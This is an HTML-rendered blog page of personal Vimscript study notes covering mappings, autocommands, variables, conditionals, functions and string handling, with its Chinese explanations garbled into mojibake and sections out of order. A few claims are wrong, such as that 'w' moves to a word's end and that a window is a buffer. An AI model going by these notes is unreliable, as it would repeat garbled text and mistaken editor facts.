href="#40-Paths" class="headerlink" title="40 Paths"></a>40 Paths</h2><h3 id="40-1-Absolute-Paths"><a href="#40-1-Absolute-Paths" class="headerlink" title="40.1 Absolute Paths"></a>40.1 Absolute Paths</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-built_in">expand</span>(<span class="hljs-string">&#x27;%&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¾“å‡ºå½“å‰æ–‡ä»¶å.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-built_in">expand</span>(<span class="hljs-string">&#x27;%:p&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¾“å‡ºå½“å‰è·¯å¾„ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-built_in">fnamemodify</span>(<span class="hljs-string">&#x27;foo.txt&#x27;</span>, <span class="hljs-string">&#x27;:p&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æŒ‡å®šå½“å‰ç›®å½•ä¸‹çš„ä¸€ä¸ªæ–‡ä»¶å (ä¸ç®¡æ˜¯å¦å­˜åœ¨)ï¼Œæ˜¾ç¤ºä»–çš„ç»å¯¹è·¯å¾„.</p><h3 id="40-2-Listing-Files"><a href="#40-2-Listing-Files" class="headerlink" title="40.2 Listing Files"></a>40.2 Listing Files</h3><p>åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-built_in">globpath</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å…¶è¿”å›çš„æ˜¯ä¸€ä¸ª <code>string</code>, æ¯åå­—ä¹‹é—´ç”¨æ¢è¡Œç¬¦åˆ†éš”. ä¸ºäº†æå–å‡ºæ¥ï¼Œä½¿ç”¨ <code>split()</code> å‡½æ•°:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">echo</span> <span class="hljs-keyword">split</span>(<span class="hljs-built_in">globpath</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>), <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>split()</code> å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯ä¸€ä¸ª <code>string</code>, ç¬¬äºŒä¸ªæ˜¯åˆ†éš”ç¬¦.</p><h1 id="ç¬¬ä¸€æ¬¡é˜…è¯»"><a href="#ç¬¬ä¸€æ¬¡é˜…è¯»" class="headerlink" title="ç¬¬ä¸€æ¬¡é˜…è¯»"></a>ç¬¬ä¸€æ¬¡é˜…è¯»</h1><h2 id="1-Echoing-Messages"><a href="#1-Echoing-Messages" class="headerlink" title="1 Echoing Messages"></a>1 Echoing Messages</h2><p><code>:echo</code>å’Œ<code>:echom</code>çš„åŒºåˆ«ï¼Œåè€…çš„ä¿¡æ¯èƒ½è¢«<code>:message</code>ä¿å­˜.</p><h2 id="2-Setting-Options"><a href="#2-Setting-Options" class="headerlink" title="2 Setting Options"></a>2 Setting Options</h2><p><code>?</code>å¯ç”¨æ¥æ£€æŸ¥çŠ¶æ€ï¼Œå¦‚ï¼š</p><pre><code class="hljs">:set number?#è‹¥æ²¡æœ‰è®¾ç½®è¡Œå·ï¼Œåˆ™æ˜¾ç¤ºnonumber</code></pre><h2 id="5-Strict-Mapping"><a href="#5-Strict-Mapping" class="headerlink" title="5 Strict Mapping"></a>5 Strict Mapping</h2><p><code>&lt;cr&gt;</code>è¡¨ç¤ºå›è½¦é”®ã€‚<br><code>:nunmap /</code>å–æ¶ˆ<code>/</code>çš„mapã€‚</p><p><mark>Norecursive Mapping</mark><br>å°±æ˜¯ä¸ä¼šé€’å½’æ›¿æ¢ã€‚<br><code>:*noremap</code>.</p><h2 id="6-2-Leader"><a href="#6-2-Leader" class="headerlink" title="6.2 Leader"></a>6.2 Leader</h2><p>å‰ç¼€prefixåœ¨è¿™é‡Œå¸¸å«<code>leader</code><br>æ”¹å˜leaderï¼š</p><pre><code class="hljs">:let mapleader = â€œ-â€#ç„¶åæ‰§è¡Œ:nnoremap &lt;leader&gt;d dd#æ­¤æ—¶-dä»£è¡¨dd </code></pre><p>æ„Ÿè§‰è¿™åƒæ˜¯ä¸€ç§çº¦å®šä¿—æˆï¼Œè€Œä¸”ä¾¿äºä¿®æ”¹ä½ æ–¹ä¾¿çš„å‰ç¼€ã€‚</p><p>å¦ä¸€ä¸ªå¯ä»¥ç”¨åœ¨ç‰¹å®šæ–‡ä»¶çš„leaderå«â€œlocal leaderâ€ï¼Œè®¾ç½®å¦‚ä¸‹ï¼š</p><pre><code class="hljs">:let maplocalleader = â€œ\\â€</code></pre><h1 id="2022-x2F-5-x2F-31"><a href="#2022-x2F-5-x2F-31" class="headerlink" title="2022&#x2F;5&#x2F;31"></a>2022&#x2F;5&#x2F;31</h1><h2 id="8-Abbreviations"><a href="#8-Abbreviations" class="headerlink" title="8 Abbreviations"></a>8 Abbreviations</h2><Keyword Characters>The abbreviation will be expanded when you type anything thatâ€™s not a letter, number, or underscore.<p>ä½¿ç”¨<code>:set iskeyword?</code>æŸ¥çœ‹å“ªäº›æ˜¯<code>keyword</code>,ä¹Ÿå°±æ˜¯ä¸ä¼šè¢«ç¼©å†™abbreviationå±•å¼€çš„å­—ç¬¦ã€‚</p><p>Abbreviation å¯ä»¥ç”¨æ¥correcting typosã€‚</p><h3 id="Abbreviation-å’Œ-mappingçš„åŒºåˆ«"><a href="#Abbreviation-å’Œ-mappingçš„åŒºåˆ«" class="headerlink" title="Abbreviation å’Œ mappingçš„åŒºåˆ«"></a>Abbreviation å’Œ mappingçš„åŒºåˆ«</h3><p>mappingä¼šç«‹å³æ‰©å±•ï¼Œè€Œabbreviationéœ€è¦åé¢è·Ÿä¸€ä¸ªç©ºæ ¼æ‰ä¼šæ‰©å±•ã€‚</p><h2 id="9-More-Mapping"><a href="#9-More-Mapping" class="headerlink" title="9 More Mapping"></a>9 More Mapping</h2><p>æŒ‰ä¸‹<code>viw</code>å¯ä»¥åœ¨å¯è§†æ¨¡å¼ä¸‹é€‰ä¸­ä¸€ä¸ªå•è¯ã€‚</p><p>æ™®é€šæ¨¡å¼ä¸‹<code>w</code>æ˜¯å…‰æ ‡ç§»åŠ¨åˆ°ä¸€ä¸ªå•è¯çš„æœ«å°¾ï¼Œ<code>b</code>æ˜¯ç§»åŠ¨åˆ°ä¸€ä¸ªå•è¯çš„å¼€å¤´ã€‚</p><h1 id="2022-x2F-6-x2F-1"><a href="#2022-x2F-6-x2F-1" class="headerlink" title="2022&#x2F;6&#x2F;1"></a>2022&#x2F;6&#x2F;1</h1><h2 id="11-Buffer-Local-Options"><a href="#11-Buffer-Local-Options" class="headerlink" title="11 Buffer-Local Options"></a>11 Buffer-Local Options</h2><p><code>&lt;buffer&gt;</code>, å‘Šè¯‰vimåœ¨å½“å‰ç¼“å†²åŒºå†…ä½¿ç”¨æ¬¡æ­¤å‘½ä»¤ã€‚</p><pre><code class="hljs">:nnoremap &lt;buffer&gt; &lt;leader&gt;x dd</code></pre><h3 id="Local-Leader"><a href="#Local-Leader" class="headerlink" title="Local Leader"></a>Local Leader</h3><p>When you create mapping that only applies to specific buffers you should use <local leader>    instead of <leader>.</p><h3 id="setting"><a href="#setting" class="headerlink" title="setting"></a>setting</h3><p><code>:setlocal</code> ä½œç”¨äºå½“å‰ç¼“å†²åŒºã€‚</p><p><code>:set</code>è®¾ç½®çš„æ˜¯å…¨å±€å€¼ã€‚</p><p>ä¸€ä¸ªwindowå°±æ˜¯ä¸€ä¸ªbufferã€‚</p><p><code>:setglobal</code>,è®¾ç½®å…¨å±€å€¼ï¼Œä½†ä¸æ”¹å˜å½“å‰bufferçš„å˜é‡ã€‚</p><h1 id="2022-x2F-6-x2F-2"><a href="#2022-x2F-6-x2F-2" class="headerlink" title="2022&#x2F;6&#x2F;2"></a>2022&#x2F;6&#x2F;2</h1><h2 id="12-Autocommand"><a href="#12-Autocommand" class="headerlink" title="12 Autocommand"></a>12 Autocommand</h2><hr><p><a href="https://blog.csdn.net/qq_42239765/article/details/111847523">å‚è€ƒ1</a></p><hr><p><code>autocmd</code>å³è‡ªåŠ¨å‘½ä»¤ï¼Œæ˜¯åœ¨æŒ‡å®šäº‹ä»¶å‘ç”Ÿæ—¶è‡ªåŠ¨æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><p>æ ¼å¼å¤§æ¦‚æ˜¯ï¼š</p><pre><code class="hljs">:autocmd event filter commandå¦‚:autocmd BufNewFile * :write</code></pre><p><code>:w</code>æ˜¯<code>:write</code>çš„ç¼©å†™ï¼Œæ„ä¸ºå°†å½“å‰ç¼“å†²åŒºçš„å†…å®¹å†™å…¥æ–‡ä»¶ã€‚</p><pre><code class="hljs">:normal gg=G</code></pre><p>ä¼šå‘Šè¯‰Vim to reindent the current file</p><p>The event type BufWritePre means the event will be checked just before you write any file.</p><p>æ‰€ä»¥è¯´ï¼Œeventå¯èƒ½å°±æ˜¯ï¼Œæ£€æŸ¥çš„æ—¶æœºï¼Œåé¢çš„filterå°±æ˜¯æ£€æŸ¥çš„å¯¹è±¡ã€‚</p><p>æŸ¥çœ‹æœ‰å“ªäº›<code>autocmd</code>çš„events</p><pre><code class="hljs">:help autocmd-events</code></pre><p><mark>Multiple Events</mark></p><pre><code class="hljs">:autocmd BufWritePre,BufRead *.html :normal gg=G</code></pre><p>ä¸€èˆ¬æŠŠ<code>BufRead</code>å’Œ<code>BufNewFile</code>ä¸¤ä¸ªeventsæ·»åŠ åˆ°ä¸€èµ·ã€‚é€—å·è¿æ¥æ—¶ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</p><pre><code class="hljs">:autocmd BufNewFile, BufRead *.html setlocal nowrap</code></pre><p><mark>FileType Events</mark><br>æœ€å¸¸ç”¨çš„å°±æ˜¯<code>FileType</code>è¿™ä¸ªeventsã€‚<br>å¦‚</p><pre><code class="hljs">:autocmd FileType JavaScript nnoremap &lt;buffer&gt; &lt;localleader&gt;c I//&lt;esc&gt;</code></pre><p>å°†autocommandå’Œbuffer local mappingç»“åˆï¼Œå¯ä»¥åˆ›å»ºç‰¹å®šçš„é”®ä½ã€‚</p><p><mark>è‡ªåŠ¨æŠ˜è¡Œ</mark></p><pre><code class="hljs">:set wrap</code></pre><p>å°±æ˜¯æŠŠé•¿çš„ä¸€è¡Œç”¨å¤šè¡Œæ˜¾ç¤ºã€‚</p><pre><code class="hljs">:set textwidth=n</code></pre><p>æ¯è¡Œè¶…è¿‡nå„å­—ç¬¦æ—¶è‡ªåŠ¨æ¢è¡Œã€‚</p><h2 id="13-Buffer-local-Abbreviations"><a href="#13-Buffer-local-Abbreviations" class="headerlink" title="13 Buffer-local Abbreviations"></a>13 Buffer-local Abbreviations</h2><p>åœ¨<code>:iabbrev</code>ä¸­ä½¿ç”¨<code>&lt;buffer&gt;</code>.</p><p><code>&lt;left&gt;</code>å³å‘å·¦ç§»åŠ¨ä¸€ä¸ªå­—ç¬¦ã€‚</p><h3 id="autocmd-events-çš„å‡ ä¸ªå‰ç¼€å’Œåç¼€"><a href="#autocmd-events-çš„å‡ ä¸ªå‰ç¼€å’Œåç¼€" class="headerlink" title="autocmd-events çš„å‡ ä¸ªå‰ç¼€å’Œåç¼€"></a>autocmd-events çš„å‡ ä¸ªå‰ç¼€å’Œåç¼€</h3><p><code>Buf</code>éƒ½ä½œä¸ºå‰ç¼€ï¼Œæ˜¯ä¸bufferç›¸å…³çš„ï¼Œå¦‚<code>BufNewFile</code>ï¼Œå°±æ˜¯åœ¨æ‰“å¼€ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶æ—¶è§¦å‘ã€‚</p><p><code>Pre</code>éƒ½ä½œä¸ºåç¼€ï¼Œ æ„ä¸ºåœ¨ä»€ä¹ˆä¹‹å‰ï¼Œå¦‚<code>BufReadPre</code>ï¼Œå°±æ˜¯åœ¨æ‰“å¼€ä¸€ä¸ªbufferåï¼Œåœ¨è¯»æ–‡ä»¶ä¹‹å‰è§¦å‘ã€‚</p><p><code>Post</code>éƒ½ä½œä¸ºåç¼€ï¼Œæ„ä¸ºåœ¨ä»€ä¹ˆä¹‹åï¼Œå¦‚<code>BufReadPost</code>ï¼Œå°±æ˜¯åœ¨æ‰“å¼€ä¸€ä¸ªbufferåï¼Œåœ¨è¯»æ–‡ä»¶ä¹‹åè§¦å‘ã€‚</p><p><code>Read</code>å’Œ<code>Write</code>ä¸€èˆ¬æ˜¯å‘½ä»¤ä¸­é—´ã€‚</p><p><code>File</code>ï¼Œä¸æ–‡ä»¶ç›¸å…³ï¼Œå¦‚<code>FileType</code>ã€‚</p><p><code>Filter</code>ä¸filterå‘½ä»¤ç›¸å…³ï¼Œå¦‚<code>FilterReadPre</code>ã€‚</p><h2 id="è¿‡æ»¤å™¨filter"><a href="#è¿‡æ»¤å™¨filter" class="headerlink" title="è¿‡æ»¤å™¨filter"></a>è¿‡æ»¤å™¨filter</h2><hr><p><a href="https://zhuanlan.zhihu.com/p/130983572">å‚è€ƒ</a></p><hr><h2 id="14-Autocommand-Groups-1"><a href="#14-Autocommand-Groups-1" class="headerlink" title="14 Autocommand Groups"></a>14 Autocommand Groups</h2><p>ä½œç”¨ï¼Œé˜²æ­¢é‡å¤å®šä¹‰ã€‚</p><pre><code class="hljs">autocmd!</code></pre><p>èƒ½å¤Ÿclearå‰é¢ç›¸åŒçš„å®šä¹‰ã€‚</p><p>Read <code>:help autocmd-groups </code></p><h2 id="15-Operator-Pending-Mappings"><a href="#15-Operator-Pending-Mappings" class="headerlink" title="15 Operator-Pending Mappings"></a>15 Operator-Pending Mappings</h2><pre><code class="hljs">:onoremap p i(</code></pre><p>è¿™é‡Œçš„ç¬¬ä¸€ä¸ª<code>o</code>å°±æ˜¯<code>operator</code>çš„æ„æ€ã€‚<br>æ­¤æ—¶ç”¨<code>dp</code>ç»“æœå°±æ˜¯åˆ é™¤æ‹¬å·é‡Œé¢çš„ã€‚<br>ç”¨åœ¨ç­‰å¾…ä¸€ä¸ªåŠ¨ä½œæ—¶ã€‚</p><p>think wayï¼š</p><ol><li>Start at the cursor position</li><li>Enter visual mode(charwise)</li><li>â€¦mapping keys go hereâ€¦</li><li>Alll the text you want to include in the movement should now be selected.</li></ol><p>Read <code>:help omap-info</code></p><h2 id="16-More-Operator-Pending-Mappings"><a href="#16-More-Operator-Pending-Mappings" class="headerlink" title="16 More Operator-Pending Mappings"></a>16 More Operator-Pending Mappings</h2><h3 id="normalå‘½ä»¤"><a href="#normalå‘½ä»¤" class="headerlink" title="normalå‘½ä»¤"></a>normalå‘½ä»¤</h3><pre><code class="hljs">:normal</code></pre><p>å‘½ä»¤ã€‚</p><pre><code class="hljs">:normal gg</code></pre><p>å°±æ˜¯è·³è½¬åˆ°å¼€å¤´ï¼Œæ‰€ä»¥ï¼Œ<code>normal</code>å‘½ä»¤å°±æ˜¯æŒ‡åœ¨<code>:normal</code>æ¨¡å¼ä¸‹è¿è¡Œå‘½ä»¤ã€‚</p><h3 id="executeå‘½ä»¤"><a href="#executeå‘½ä»¤" class="headerlink" title="executeå‘½ä»¤"></a>executeå‘½ä»¤</h3><pre><code class="hljs">:execute â€œwriteâ€</code></pre><p>å°±æ˜¯æ‰§è¡Œä¸€æ®µVimscriptå‘½ä»¤ã€‚</p><h4 id="g"><a href="#g" class="headerlink" title="g_"></a>g_</h4><p>ç§»åŠ¨åˆ°the last non-blank character in the line.</p><hr><p>Read <code>:help pattern-overview</code><br>Read <code>:help normal</code><br>Read <code>:help execute</code><br>Read <code>:help expr-quote</code></p><h2 id="17-Status-Lines"><a href="#17-Status-Lines" class="headerlink" title="17 Status Lines"></a>17 Status Lines</h2><p>å°±æ˜¯é¡µé¢æœ€ä¸‹é¢é‚£ä¸€è¡Œï¼Œå¯ä»¥æ”¹å˜è¾“å‡ºçš„å†…å®¹ã€‚</p><pre><code class="hljs">:set statusline=%f</code></pre><p>Things that start with % are expanded to different text depending on what comes after them.</p><p>ç©ºç™½å­—ç¬¦éœ€è½¬ä¹‰ã€‚</p><pre><code class="hljs">:set statusline=%f\ -\ FileType:\ %y</code></pre><p>åœ¨å½“å‰çš„statuslineåé¢æ·»åŠ ï¼š</p><pre><code class="hljs">:set statusline+=FileType</code></pre><p>æŸ¥é˜…</p><pre><code class="hljs">:help statusline</code></pre><h2 id="18-Responsible-Coding"><a href="#18-Responsible-Coding" class="headerlink" title="18 Responsible Coding"></a>18 Responsible Coding</h2><p>åœ¨normalæ¨¡å¼ä¸‹Fold you code by</p><pre><code class="hljs">za    </code></pre><h3 id="fold-everything-automatically"><a href="#fold-everything-automatically" class="headerlink" title="fold everything automatically"></a>fold everything automatically</h3><pre><code class="hljs">:help foldlevelstart</code></pre><p>è®¾ç½®<code>foldlevel</code>çš„å€¼æ¥å†³å®šfoldã€‚</p><p>ä¸€èˆ¬æƒ…å†µï¼š</p><pre><code class="hljs">set foldlevel=</code></pre><p>æ”¾åœ¨autocmdå‰é¢ï¼Œä»¥ä¾¿ä¿®æ”¹ä¸åŒç±»å‹æ–‡ä»¶çš„foldlevelã€‚</p><h2 id="19-Variables"><a href="#19-Variables" class="headerlink" title="19 Variables"></a>19 Variables</h2><p><code>set</code>å’Œ<code>let</code>çš„åŒºåˆ«ã€‚</p><hr><p><a href="https://blog.csdn.net/s634772208/article/details/78994790?utm_source=app&app_version=5.5.0">å‚è€ƒ</a></p><hr><p>è¿™é‡Œå¯èƒ½è¦åŒºåˆ†é€‰é¡¹optionså’Œå˜é‡variablesã€‚</p><p><code>set</code>åªèƒ½ç”¨ä¸è®¾ç½®é€‰é¡¹ï¼Œä¸”ä¸èƒ½è¿›è¡Œè¿ç®—ï¼Œå¦‚</p><pre><code class="hljs">:set textwidth=100+1</code></pre><p>ä¼šæŠ¥é”™ã€‚</p><p><code>let</code>å¯ä»¥ç”¨äºå˜é‡å’Œé€‰é¡¹ï¼Œåªä¸è¿‡ä¿®æ”¹é€‰é¡¹æ—¶è¦åŠ ä¸Š<code>&amp;</code>ï¼Œå¦‚</p><pre><code class="hljs">:let &amp;textwidth=100+1</code></pre><p>ä¿®æ”¹å˜é‡æ—¶ç”¨<code>&amp;</code>å°±ä¼šæŠ¥é”™ã€‚</p><p><code>set</code>è¿˜èƒ½æŸ¥çœ‹é€‰é¡¹çš„å€¼ï¼Œå¦‚</p><pre><code class="hljs">set textwidth?</code></pre><p>ä»¥ä¸Šè®¾ç½®çš„éƒ½æ˜¯å…¨å±€çš„å˜é‡å’Œé€‰é¡¹ã€‚</p><h3 id="Local-Options"><a href="#Local-Options" class="headerlink" title="Local Options"></a>Local Options</h3><pre><code class="hljs">:let &amp;1:number = 1</code></pre><p>æŠ¥é”™äº†ã€‚</p><h3 id="Registers-as-Variables"><a href="#Registers-as-Variables" class="headerlink" title="Registers as Variables"></a>Registers as Variables</h3><p>Read and set registers as variables.</p><pre><code class="hljs">:let @a = â€œhello!â€</code></pre><p>æŠŠå¯„å­˜å™¨açš„å€¼è®¾ç½®ä¸ºâ€œhello!â€ï¼Œå¯ä»¥åœ¨normalä¸­å¼•ç”¨å¯„å­˜å™¨çš„å€¼</p><pre><code class="hljs">â€œap</code></pre><p>ç²˜è´´açš„å€¼ã€‚</p><p><code>â€</code>å¯„å­˜å™¨ï¼Œä¿å­˜ä¸Šä¸€æ¬¡å¤åˆ¶ç²˜è´´çš„å€¼ï¼Œå¦‚</p><pre><code class="hljs">echo @â€œ</code></pre><p><code>/</code>å¯„å­˜å™¨ï¼Œä¿å­˜ä¸Šä¸€æ¬¡æŸ¥æ‰¾çš„å€¼ï¼Œå¦‚</p><pre><code class="hljs">echo @/</code></pre><p>You should never use <code>let</code> if <code>set</code> will suffice.</p><p>Read <code>:help registers</code>.</p><h2 id="Variable-Scoping"><a href="#Variable-Scoping" class="headerlink" title="Variable Scoping"></a>Variable Scoping</h2><p>Like</p><pre><code class="hljs">:let b:hello = â€œworldâ€</code></pre><p><code>b:</code> is a scope for variables, è¡¨ç¤ºè®¾ç½®ä¸ºå±€éƒ¨å€¼ã€‚</p><p>æµè§ˆscopesè¡¨<code>:help internal-variables</code></p><h2 id="21-Conditionals"><a href="#21-Conditionals" class="headerlink" title="21 Conditionals"></a>21 Conditionals</h2><h3 id="Multiple-Line-Statements"><a href="#Multiple-Line-Statements" class="headerlink" title="Multiple-Line Statements"></a>Multiple-Line Statements</h3><p>Use <code>|</code> to separate each line</p><pre><code class="hljs">:echom â€œfooâ€ | echom â€œbarâ€</code></pre><h3 id="Basic-if"><a href="#Basic-if" class="headerlink" title="Basic if"></a>Basic if</h3><pre><code class="hljs">:if 1:   echom â€œZEROâ€:endif</code></pre><p>Vimscriptä¸­çš„å­—ç¬¦ä¸²çš„å€¼è¦æ ¹æ®ä¸Šä¸‹æ–‡åˆ¤æ–­ã€‚å¦‚</p><pre><code class="hljs">if â€œ10â€ #è¿™é‡Œè¡¨ç¤ºæ•°å­—if â€œ10numâ€ #è¿™é‡Œä¹Ÿè¡¨ç¤ºæ•°å­—if â€œnum10â€ #è¿™é‡Œä¸æ˜¯æ•°å­—äº†â€œhelloâ€ + 10 #å€¼ä¸º10</code></pre><h3 id="else-å’Œ-elseif"><a href="#else-å’Œ-elseif" class="headerlink" title="else å’Œ elseif"></a>else å’Œ elseif</h3><pre><code class="hljs">if  0    echom â€œifâ€elseif â€œnope!â€    echom â€œelseifâ€else     echom â€œfinallyâ€endif</code></pre><h2 id="22-Comparisons"><a href="#22-Comparisons" class="headerlink" title="22 Comparisons"></a>22 Comparisons</h2><pre><code class="hljs">if 10 &gt; 1    echom â€œfooâ€endif</code></pre><h3 id="Case-Sensitivity"><a href="#Case-Sensitivity" class="headerlink" title="Case Sensitivity"></a>Case Sensitivity</h3><pre><code class="hljs">:set noignorecase:set ignorecase</code></pre><p>è®¾ç½®å¤§å°å†™æ•æ„Ÿã€‚</p><h3 id="Code-Defensively"><a href="#Code-Defensively" class="headerlink" title="Code Defensively"></a>Code Defensively</h3><p>A bare â€œ&#x3D;&#x3D;â€ should never appear in your pluginsâ€™ code.    </p><p><code>==?</code> case-insensitive no matter what the user has set.</p><p><code>==#</code> case-sensitive no matter what the user has set.</p><p>åœ¨æ•°å­—åšæ¯”è¾ƒæ˜¯ä¹Ÿå¤šç”¨ä¸Šé¢ä¸¤ä¸ªoperatorã€‚</p><p>Read :help ignorecase<br>Read :help expr4</p><h2 id="23-Functions"><a href="#23-Functions" class="headerlink" title="23 Functions"></a>23 Functions</h2><p>Define the function</p><pre><code class="hljs">function Meow()    echom â€œMeow!â€endfunction</code></pre><p>Running the function</p><pre><code class="hljs">call Meow()</code></pre><p>Returning a value</p><pre><code class="hljs">function GetMeow()    return â€œMeow String!â€endfunction</code></pre><h3 id="Implicit-Returning"><a href="#Implicit-Returning" class="headerlink" title="Implicit Returning"></a>Implicit Returning</h3><p>æ²¡æœ‰æ˜ç¡®çš„å†™<code>return</code>çš„è¯ï¼Œä¼šæœ‰implicit returning.</p><p>Read <code>:help call</code></p><p>Read <code>:help E124</code> çœ‹é‚£äº›å¯ä»¥å½“ä½œå‡½æ•°åã€‚ must start with a capital or â€œs:â€</p><p>Read <code>:help return</code></p><h2 id="24-Function-Arguments"><a href="#24-Function-Arguments" class="headerlink" title="24 Function Arguments"></a>24 Function Arguments</h2><h3 id="å¯¹scopeçš„ç†è§£"><a href="#å¯¹scopeçš„ç†è§£" class="headerlink" title="å¯¹scopeçš„ç†è§£"></a>å¯¹scopeçš„ç†è§£</h3><p>å¯èƒ½æ˜¯å’Œåç§°ç©ºé—´å·®ä¸å¤šçš„ç©æ„ã€‚</p><p><code>a:name</code>è¿™é‡Œçš„<code>:a</code>è¡¨ç¤ºvariable scopeã€‚</p><p>æ‰€æœ‰çš„å˜é‡è°ƒç”¨æ—¶éƒ½è¦åŠ ä¸Š<code>a:</code></p><p>Global variable need to be accessed with <code>:g</code>.</p><hr><h3 id="Varargs"><a href="#Varargs" class="headerlink" title="Varargs"></a>Varargs</h3><pre><code class="hljs">function Varg(...)    echom a:0    echom a:1    echom a:000endfunction</code></pre><p><code>a:0</code>è¡¨ç¤ºextra variableçš„æ•°é‡ã€‚</p><p><code>a:1</code>è¡¨ç¤ºç¬¬ä¸€ä¸ªextra variableçš„å€¼ã€‚</p><p><code>a:000</code>è¡¨ç¤ºæ‰€æœ‰extra variableçš„åˆ—è¡¨ã€‚</p><h3 id="Assignment"><a href="#Assignment" class="headerlink" title="Assignment"></a>Assignment</h3><pre><code class="hljs">function AssignGood(foo)    let a:foo_tmp = a:fooendfunction</code></pre><p>Read <code>:help function-argument</code><br>Read <code>:help local-variables</code></p><h2 id="25-Numbers"><a href="#25-Numbers" class="headerlink" title="25 Numbers"></a>25 Numbers</h2><p>Two types:</p><ul><li>Numbers, 32 bit signed</li><li>Floats</li></ul><p>ä»¥<code>0</code>å¼€å¤´çš„æ•°å­—è¡¨ç¤ºoctal numberï¼Œä»¥<code>0x</code>å¼€å¤´çš„æ•°å­—è¡¨ç¤ºhexã€‚</p><pre><code class="hljs">echo 5e4</code></pre><p>ä¼šæŠ¥é”™ã€‚</p><h3 id="Coercion"><a href="#Coercion" class="headerlink" title="Coercion"></a>Coercion</h3><pre><code class="hljs">echo 2 * 2.0</code></pre><p>ç»“æœä¸ºæµ®ç‚¹æ•°ã€‚</p><h3 id="division"><a href="#division" class="headerlink" title="division"></a>division</h3><pre><code class="hljs">echo 3 / 2 </code></pre><p>ç»“æœä¸º1.</p><pre><code class="hljs">echo 3 / 2.0</code></pre><p>ç»“æœä¸º1.5.</p><p>Read <code>:help Float</code><br>Read <code>:help float-point-precision</code></p><h2 id="Strings"><a href="#Strings" class="headerlink" title="Strings"></a>Strings</h2><h3 id="Concatenation"><a href="#Concatenation" class="headerlink" title="Concatenation"></a>Concatenation</h3><pre><code class="hljs">echom â€œHello,â€ + â€œworldâ€</code></pre><p>è¾“å‡º0ï¼Œvimçš„<code>+</code>åªç”¨äºnumbersã€‚</p><p>vimä¸ä¼šcoerce string to float</p><pre><code class="hljs">echom 10 + â€œ10.10â€</code></pre><p>è¾“å‡º20.</p><p><code>.</code> is the concatenate strings operator.</p><pre><code class="hljs">echom â€œHelloï¼Œ â€ . â€œworldâ€</code></pre><p>å°†ä¸¤ä¸ªstringè¿æ¥èµ·æ¥ã€‚</p><pre><code class="hljs">echom 10.1 . â€œfooâ€</code></pre><p>ä¼šæŠ¥é”™ã€‚</p><p>Donâ€™t rely on Vimâ€™s coercion.</p><h3 id="Special-Characters"><a href="#Special-Characters" class="headerlink" title="Special Characters"></a>Special Characters</h3><p>ç”¨<code>\</code>è½¬ä¹‰ã€‚</p><p><code>foo^@bar</code>ä¸­çš„<code>^@</code> is Vimâ€™s way of saying â€œnewline characterâ€.</p><h3 id="Literal-Strings"><a href="#Literal-Strings" class="headerlink" title="Literal Strings"></a>Literal Strings</h3><p>ä½¿ç”¨å•å¼•å·<code>â€™ â€™</code>ã€‚</p><p>é‡Œé¢æ²¡æœ‰è½¬ä¹‰å­—ç¬¦ã€‚</p><pre><code class="hljs">echom â€˜\n\\â€™</code></pre><p>æ˜¾ç¤º<code>\n\\</code>.</p><h3 id="Truthiness"><a href="#Truthiness" class="headerlink" title="Truthiness"></a>Truthiness</h3><hr><p>Read <code>:help express-quote</code><br>Read <code>:help i_CTRL-V</code><br>Read <code>:help literal-string</code></p><hr><h2 id="27-String-Functions"><a href="#27-String-Functions" class="headerlink" title="27 String Functions"></a>27 String Functions</h2><h3 id="Length"><a href="#Length" class="headerlink" title="Length"></a>Length</h3><pre><code class="hljs">echom strlen(â€œfooâ€)</code></pre><h3 id="Splitting"><a href="#Splitting" class="headerlink" title="Splitting"></a>Splitting</h3><pre><code class="hljs">echo split(â€œone two threeâ€)</code></pre><p>è¾“å‡º<code>[â€˜oneâ€™, â€˜twoâ€™, â€˜threeâ€™]</code>.</p><p>å°†å­—ç¬¦ä¸²åˆ†è§£ä¸ºlistã€‚</p><pre><code class="hljs">echo split(â€œone, two, threeâ€, â€œ,â€)</code></pre><p>è¾“å‡º<code>[â€˜oneâ€™, â€˜twoâ€™, â€˜threeâ€™]</code>ï¼Œæ­¤æ—¶æ˜¯ä»¥<code>,</code>ä½œä¸ºåˆ†éš”ï¼Œè‹¥ä¸æŒ‡å®šåˆ™é»˜è®¤ä¸ºç©ºç™½å­—ç¬¦ã€‚</p><h3 id="Joining"><a href="#Joining" class="headerlink" title="Joining"></a>Joining</h3><pre><code class="hljs">echo join([â€œfooâ€, â€œbarâ€], â€œ...â€)</code></pre><p>è¾“å‡º<code>foo...bar</code>ï¼Œå°±æ˜¯ç”¨åé¢æŒ‡å®šçš„ç¬¦å·è¿æ¥åˆ—è¡¨ä¸­çš„å„å…ƒç´ ã€‚</p><p>å’Œsplité…åˆä½¿ç”¨</p><pre><code class="hljs">echo join(split(â€œfoo barâ€), â€œ;â€)</code></pre><p>è¾“å‡º<code>foo;bar</code>.</p><h3 id="Lower-and-Upper-Case"><a href="#Lower-and-Upper-Case" class="headerlink" title="Lower 